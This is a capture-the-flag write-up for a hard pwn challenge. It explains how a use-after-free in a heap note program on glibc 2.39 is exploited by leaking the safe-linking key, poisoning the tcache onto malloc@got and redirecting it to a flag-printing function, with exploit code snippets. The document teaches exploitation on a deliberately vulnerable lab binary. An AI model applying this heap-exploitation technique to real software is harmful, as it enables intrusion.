# Loose Ends

**Category:** pwn  **Difficulty:** hard  **Author:** abu

> Sparrow Freight keeps its books on a scratchpad ledger, and the clerk who crosses out old entries is not half as thorough as he believes. There is also an audit that reads the day's clearance code aloud, which nobody has ever bothered to call.
>
> Tie up the loose ends.

Handout: `challenge/ledger.zip` (binary, libc, ld). Source is in `challenge/ledger.c`.

## Solution

Heap note app on glibc 2.39. `delete()` frees the note but leaves the pointer in the array, and `view()`/`edit()` still work on it. That's a UAF read and a UAF write. Every note is `malloc(0x50)`, so everything lives in the 0x60 tcache bin. No PIE, Partial RELRO, and an `audit()` that prints `/flag` which nothing calls.

Plan: tcache poison onto the GOT and point `malloc@got` at `audit`.

First, safe-linking. Since 2.32 the tcache `fd` is stored as `(chunk_addr >> 12) ^ next`. Free a single chunk (so `next` is NULL) and view it, and you get the heap key directly:

```python
add(0); add(1); delete(0)
key = u64(view(0)[:8])        # chunk0 >> 12
```

Free the second chunk so the bin has two entries, then overwrite the head's `fd`. Both chunks are on the same page, so the same key works:

```python
delete(1)
edit(1, p64(key ^ malloc_got))
```

The target has to be picked with some care:

- 2.39 aborts on an unaligned tcache chunk. `malloc@got` (`0x404040`) is 16-byte aligned.
- `tcache_get` zeroes the `key` field at +8 of the returned chunk. `malloc@got+8` is `setvbuf@got`, which is only used at startup, so nulling it is fine. Going for `free@got` instead nulls `puts@got` and the menu dies.

```python
add(2)                # pops chunk1, head is now malloc@got
add(3, p64(audit))    # returns malloc@got, write audit there
add(5)                # malloc -> audit -> flag
```

The binary is built with CET, but `audit` starts with `endbr64` so the indirect call is fine.

```
cd challenge && python3 ../solution/exploit.py <host> <port>
```

(The script loads `ledger` from the current directory.)

Flag is dynamic per team. Local one: `H7CTF{us3_4ft3r_fr33_t04ch3_p01s0n_g0t}`
